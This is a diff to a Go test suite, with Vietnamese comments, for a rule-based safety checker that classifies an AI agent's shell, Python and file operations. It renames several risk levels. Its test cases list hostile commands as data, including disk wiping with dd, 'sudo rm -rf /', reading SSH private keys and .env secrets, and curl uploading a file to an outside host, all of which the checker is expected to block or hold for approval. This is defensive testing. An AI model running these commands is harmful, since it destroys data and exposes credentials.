@@ -165,7 +165,7 @@ df = pd.read_csv('/workspace/data.csv')
 print(df.head())
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
@@ -178,7 +178,7 @@ for row in ws.iter_rows(values_only=True):
     print(row)
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
@@ -190,7 +190,7 @@ for para in doc.paragraphs:
     print(para.text)
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
@@ -201,7 +201,7 @@ with open('/workspace/notes.txt', 'r', encoding='utf-8') as f:
 print(content[:500])
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 	}
@@ -236,28 +236,28 @@ func TestPolicy_TaoFile_Shell(t *testing.T) {
 			name:           "mkdir output",
 			req:            shellReq("w-sh-01", "mkdir -p /workspace/output"),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
 			name:           "touch new file",
 			req:            shellReq("w-sh-02", "touch /workspace/output/result.txt"),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
 			name:           "cp copy file",
 			req:            shellReq("w-sh-03", "cp /workspace/input/template.xlsx /workspace/output/report.xlsx"),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
 			name:           "python run script that creates output",
 			req:            shellReq("w-sh-04", "python3 /workspace/process.py"),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 	}
@@ -276,7 +276,7 @@ result.to_csv('/workspace/output/summary.csv', index=False)
 print('Done:', len(result), 'rows')
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
@@ -290,7 +290,7 @@ ws.append(['Alice', 95])
 wb.save('/workspace/output/scores.xlsx')
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
@@ -303,7 +303,7 @@ doc.add_paragraph('Kết quả phân tích dữ liệu tháng 6.')
 doc.save('/workspace/output/report.docx')
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
@@ -315,7 +315,7 @@ with open('/workspace/output/result.json', 'w') as f:
     json.dump(data, f, ensure_ascii=False, indent=2)
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 	}
@@ -328,14 +328,14 @@ func TestPolicy_TaoFile_FileOps(t *testing.T) {
 			name:           "file_ops write",
 			req:            fileOpsReq("w-fo-01", "write", "/workspace/output/summary.txt"),
 			wantDecision:   DecisionAllow,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		{
 			name:           "file_ops copy",
 			req:            fileOpsReq("w-fo-02", "copy", "/workspace/input/template.xlsx"),
 			wantDecision:   DecisionAllow,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 	}
@@ -350,35 +350,35 @@ func TestPolicy_XoaFile_Shell(t *testing.T) {
 			name:         "rm single file",
 			req:          shellReq("d-sh-01", "rm /workspace/output/old_report.csv"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
 			name:         "rm -rf temp dir",
 			req:          shellReq("d-sh-02", "rm -rf /workspace/temp"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
 			name:         "rm wildcard csv",
 			req:          shellReq("d-sh-03", "rm /workspace/output/*.csv"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
 			name:         "rmdir empty folder",
 			req:          shellReq("d-sh-04", "rmdir /workspace/old_input"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
 			name:         "mv (rename = implicit delete old)",
 			req:          shellReq("d-sh-05", "mv /workspace/draft.docx /workspace/final.docx"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 		},
 	}
 	runPolicyCases(t, cases)
@@ -394,7 +394,7 @@ os.remove('/workspace/output/temp_file.csv')
 print('Deleted')
 `),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
@@ -404,7 +404,7 @@ import shutil
 shutil.rmtree('/workspace/cache')
 `),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
@@ -415,7 +415,7 @@ p = Path('/workspace/output/old.xlsx')
 p.unlink()
 `),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		{
@@ -426,7 +426,7 @@ for f in glob.glob('/workspace/output/*.tmp'):
     os.remove(f)
 `),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 	}
@@ -439,13 +439,13 @@ func TestPolicy_XoaFile_FileOps(t *testing.T) {
 			name:         "file_ops delete",
 			req:          fileOpsReq("d-fo-01", "delete", "/workspace/output/old_data.csv"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 		},
 		{
 			name:         "file_ops move",
 			req:          fileOpsReq("d-fo-02", "move", "/workspace/draft.txt"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 		},
 	}
 	runPolicyCases(t, cases)
@@ -459,14 +459,14 @@ func TestPolicy_HeThong_Shutdown(t *testing.T) {
 			name:         "shutdown now",
 			req:          shellReq("sys-sh-01", "shutdown -h now"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatSystemShutdown},
 		},
 		{
 			name:         "reboot",
 			req:          shellReq("sys-sh-02", "reboot"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatSystemShutdown},
 		},
 		{
@@ -476,7 +476,7 @@ import os
 os.system('shutdown /s /t 0')
 `),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatSystemShutdown},
 		},
 	}
@@ -489,28 +489,28 @@ func TestPolicy_HeThong_ServiceControl(t *testing.T) {
 			name:         "systemctl stop service",
 			req:          shellReq("sys-sh-03", "systemctl stop nginx"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
 		},
 		{
 			name:         "service restart",
 			req:          shellReq("sys-sh-04", "service postgresql restart"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
 		},
 		{
 			name:         "windows sc stop",
 			req:          shellReq("sys-sh-05", "sc stop wuauserv"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
 		},
 		{
 			name:         "net stop service",
 			req:          shellReq("sys-sh-06", "net stop \"Windows Update\""),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatServiceControl},
 		},
 	}
@@ -523,14 +523,14 @@ func TestPolicy_HeThong_Registry(t *testing.T) {
 			name:         "reg add key",
 			req:          shellReq("sys-sh-07", "reg add HKLM\\SOFTWARE\\MyApp /v Version /t REG_SZ /d 1.0"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatRegistryAccess},
 		},
 		{
 			name:         "reg delete key",
 			req:          shellReq("sys-sh-08", "reg delete HKCU\\Software\\Temp /f"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatRegistryAccess},
 		},
 		{
@@ -540,7 +540,7 @@ import winreg
 key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft')
 `),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatRegistryAccess},
 		},
 	}
@@ -553,26 +553,26 @@ func TestPolicy_HeThong_PrivilegeEscalation(t *testing.T) {
 			name:         "sudo rm root",
 			req:          shellReq("sys-sh-09", "sudo rm -rf /"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatPrivilegeEscalation},
 		},
 		{
 			name:         "chmod 777 sensitive",
 			req:          shellReq("sys-sh-10", "chmod 777 /etc/passwd"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 		},
 		{
 			name:         "kill all python processes",
 			req:          shellReq("sys-sh-11", "killall python3"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 		},
 		{
 			name:         "dd wipe disk",
 			req:          shellReq("sys-sh-12", "dd if=/dev/zero of=/dev/sda"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 		},
 	}
 	runPolicyCases(t, cases)
@@ -584,21 +584,21 @@ func TestPolicy_HeThong_CredentialAccess(t *testing.T) {
 			name:         "cat .env file",
 			req:          shellReq("cred-sh-01", "cat /workspace/.env"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskCredentialAccess,
+			wantRisk:     RiskSensitiveRead,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
 		},
 		{
 			name:         "read id_rsa private key",
 			req:          shellReq("cred-sh-02", "cat /root/.ssh/id_rsa"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskCredentialAccess,
+			wantRisk:     RiskSensitiveRead,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
 		},
 		{
 			name:         "access credentials.json",
 			req:          shellReq("cred-sh-03", "cat /workspace/credentials.json"),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskCredentialAccess,
+			wantRisk:     RiskSensitiveRead,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
 		},
 		{
@@ -609,7 +609,7 @@ with open('/workspace/.env', 'r') as f:
 print(secrets)
 `),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskCredentialAccess,
+			wantRisk:     RiskSensitiveRead,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
 		},
 		{
@@ -621,7 +621,7 @@ load_dotenv('/workspace/.env')
 print(os.getenv('API_KEY'))
 `),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskCredentialAccess,
+			wantRisk:     RiskSensitiveRead,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatCredentialAccess},
 		},
 	}
@@ -634,14 +634,14 @@ func TestPolicy_HeThong_NetworkAccess(t *testing.T) {
 			name:         "curl external URL",
 			req:          shellReq("net-sh-01", "curl https://api.example.com/data"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskExternalNetwork,
+			wantRisk:     RiskExternalWrite,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
 		},
 		{
 			name:         "wget download file",
 			req:          shellReq("net-sh-02", "wget https://files.example.com/dataset.zip -O /workspace/data.zip"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskExternalNetwork,
+			wantRisk:     RiskExternalWrite,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
 		},
 		{
@@ -652,7 +652,7 @@ resp = requests.get('https://api.example.com/v1/items')
 data = resp.json()
 `),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskExternalNetwork,
+			wantRisk:     RiskExternalWrite,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
 		},
 		{
@@ -662,7 +662,7 @@ import subprocess
 result = subprocess.run(['curl', 'https://example.com'], capture_output=True)
 `),
 			wantDecision: DecisionBlock,
-			wantRisk:     RiskHighRisk,
+			wantRisk:     RiskDestructive,
 		},
 	}
 	runPolicyCases(t, cases)
@@ -694,7 +694,7 @@ print(df.dtypes)
 print(df.shape)
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		// Bước 3: Phân tích dữ liệu và ghi kết quả
@@ -707,7 +707,7 @@ summary = df.groupby('region')['revenue'].agg(['sum', 'mean', 'count'])
 summary.to_excel('/workspace/output/regional_summary.xlsx')
 `),
 			wantDecision:   DecisionRequiresApproval,
-			wantRisk:       RiskSafeWrite,
+			wantRisk:       RiskLocalWrite,
 			noThreatExpect: true,
 		},
 		// Bước 4: Xóa file tạm → phải qua HITL
@@ -719,7 +719,7 @@ for f in glob.glob('/workspace/output/*.tmp'):
     os.remove(f)
 `),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskNeedsApproval,
+			wantRisk:     RiskDestructive,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatFileDeletion},
 		},
 		// Bước 5: Kiểm tra output
@@ -735,19 +735,19 @@ for f in glob.glob('/workspace/output/*.tmp'):
 			name:         "unexpected network call - blocked",
 			req:          shellReq("wf-06", "curl https://external-api.com/upload -d @/workspace/output/regional_summary.xlsx"),
 			wantDecision: DecisionRequiresApproval,
-			wantRisk:     RiskExternalNetwork,
+			wantRisk:     RiskExternalWrite,
 			wantThreats:  []safety.ThreatCategory{safety.ThreatNetworkAccess},
 		},
 	}
 	runPolicyCases(t, cases)
 }
 
-// ─── 6. SafeWriteRequiresConfirm mode ────────────────────────────────────────
+// ─── 6. LocalWriteRequiresConfirm mode ────────────────────────────────────────
 //
-// Khi bật chế độ conservative, mọi thao tác safe_write đều cần xác nhận.
+// Khi bật chế độ conservative, mọi thao tác local_write đều cần xác nhận.
 
-func TestPolicy_ConservativeMode_SafeWrite(t *testing.T) {
-	conservative := NewRuleBasedChecker(RuleBasedConfig{SafeWriteRequiresConfirm: true})
+func TestPolicy_ConservativeMode_LocalWrite(t *testing.T) {
+	conservative := NewRuleBasedChecker(RuleBasedConfig{LocalWriteRequiresConfirm: true})
 
 	conservativeCases := []struct {
 		name string
@@ -766,8 +766,8 @@ func TestPolicy_ConservativeMode_SafeWrite(t *testing.T) {
 			if r.Decision != DecisionRequiresApproval {
 				t.Errorf("conservative mode: expected requires_approval, got %q", r.Decision)
 			}
-			if r.RiskLevel != RiskSafeWrite {
-				t.Errorf("conservative mode: risk_level should still be safe_write, got %q", r.RiskLevel)
+			if r.RiskLevel != RiskLocalWrite {
+				t.Errorf("conservative mode: risk_level should still be local_write, got %q", r.RiskLevel)
 			}
 		})
 	}
